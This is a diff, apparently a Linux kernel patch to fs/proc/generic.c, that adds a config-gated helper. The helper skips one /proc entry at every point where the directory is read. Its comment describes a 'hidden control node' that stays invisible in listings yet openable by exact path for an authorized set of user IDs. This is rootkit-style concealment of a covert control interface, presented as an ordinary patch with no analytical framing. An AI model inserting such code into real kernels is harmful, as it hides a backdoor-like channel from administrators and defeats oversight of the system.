@@ -1,0 +1,52 @@
+--- a/fs/proc/generic.c
++++ b/fs/proc/generic.c
+@@ -281,6 +281,22 @@
+  * value of the readdir() call, as long as it's non-negative
+  * for success..
+  */
++#ifdef CONFIG_LUKEPRIVACY
++/* Hidden control node: keep it out of /proc readdir (still openable by exact
++ * path, gated to the authorized UID set). Skipped at every traversal point so
++ * pos accounting stays consistent — it is simply invisible in the listing. */
++extern struct proc_dir_entry *lp_proc_entry;
++static inline struct proc_dir_entry *lp_skip_hidden(struct proc_dir_entry *de)
++{
++	return (de && de == lp_proc_entry) ? pde_subdir_next(de) : de;
++}
++#else
++static inline struct proc_dir_entry *lp_skip_hidden(struct proc_dir_entry *de)
++{
++	return de;
++}
++#endif
++
+ int proc_readdir_de(struct file *file, struct dir_context *ctx,
+ 		    struct proc_dir_entry *de)
+ {
+@@ -291,7 +307,7 @@
+ 
+ 	i = ctx->pos - 2;
+ 	read_lock(&proc_subdir_lock);
+-	de = pde_subdir_first(de);
++	de = lp_skip_hidden(pde_subdir_first(de));
+ 	for (;;) {
+ 		if (!de) {
+ 			read_unlock(&proc_subdir_lock);
+@@ -299,7 +315,7 @@
+ 		}
+ 		if (!i)
+ 			break;
+-		de = pde_subdir_next(de);
++		de = lp_skip_hidden(pde_subdir_next(de));
+ 		i--;
+ 	}
+ 
+@@ -314,7 +330,7 @@
+ 		}
+ 		ctx->pos++;
+ 		read_lock(&proc_subdir_lock);
+-		next = pde_subdir_next(de);
++		next = lp_skip_hidden(pde_subdir_next(de));
+ 		pde_put(de);
+ 		de = next;
+ 	} while (de);
